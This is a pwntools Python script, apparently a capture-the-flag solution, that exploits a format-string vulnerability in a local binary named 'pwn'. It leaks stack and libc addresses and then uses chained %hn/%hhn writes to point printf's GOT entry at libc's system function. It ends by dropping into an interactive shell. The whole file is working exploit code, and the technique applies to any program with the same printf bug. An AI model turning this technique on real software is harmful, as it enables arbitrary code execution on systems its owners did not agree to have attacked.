from pwn import *
io=process('./pwn')
libc=ELF('./libc.so.6')
#context.log_level='debug'
def bug():
    gdb.attach(io)
payload=b'%6$p%7$p'
io.send(payload)
io.recvuntil(b'0x')
stack=int(io.recv(12),16)
io.recvuntil(b'0x')
base=int(io.recv(12),16)-0x2a1ca

print(f"stack=>{hex(stack)}")
print(f"libc_base=>{hex(base)}")

#03:0018│+018     0x7fffffffd9b8 —▸ 0x7fffffffdac8 —▸ 0x7fffffffde54 ◂— '/home/zer00ne/desktop/sec/pwn'
#25:0128│ rbx     0x7fffffffdac8 —▸ 0x7fffffffde54 ◂— '/home/zer00ne/desktop/sec/pwn'
#
printf_got=0x404000
space_stack=stack-0x78+0x50#0x7fffffffde54->0x7fffffffda68
payload=f"%{space_stack&0xffff}c".encode()+b"%9$hn\x00"#%hn->2bytes
io.send(payload.ljust(0x1000,b'\x00'))
payload=b"%43$hhn\x00"#%hhn->1byte
io.send(payload.ljust(0x1000,b'\x00'))
payload=f"%{(space_stack&0xffff)+1}c".encode()+b"%9$hn\x00"
print(payload.ljust(0x1000,b'\x00'))
io.send(payload.ljust(0x1000,b'\x00'))
payload=b"%64c%43$hhn\x00"
io.send(payload.ljust(0x1000,b'\x00'))
payload=f"%{(space_stack&0xffff)+2}c".encode()+b"%9$hn\x00"
io.send(payload.ljust(0x1000,b'\x00'))
payload=b"%64c%43$hhn\x00"
io.send(payload.ljust(0x1000,b'\x00'))
system=base+libc.sym.system
print(hex(system))
#====================================#
space_stack=space_stack+8
printf_got=0x404001
#====================================#
payload=f"%{space_stack&0xffff}c".encode()+b"%9$hn\x00"#%hn->2bytes
#bug()
io.send(payload.ljust(0x1000,b'\x00'))
payload=b"%c%43$hhn\x00"#%hhn->1byte
io.send(payload.ljust(0x1000,b'\x00'))
payload=f"%{(space_stack&0xffff)+1}c".encode()+b"%9$hn\x00"
print(payload.ljust(0x1000,b'\x00'))
io.send(payload.ljust(0x1000,b'\x00'))
payload=b"%64c%43$hhn\x00"
io.send(payload.ljust(0x1000,b'\x00'))
payload=f"%{(space_stack&0xffff)+2}c".encode()+b"%9$hn\x00"
io.send(payload.ljust(0x1000,b'\x00'))
payload=b"%64c%43$hhn\x00"
io.send(payload.ljust(0x1000,b'\x00'))

t1=system&0xff
t2=(system>>8)&0xffff
payload=f"%{t1}c%21$hhn%{t2-t1}c%22$hn"
io.send(payload)
bug()

io.interactive()
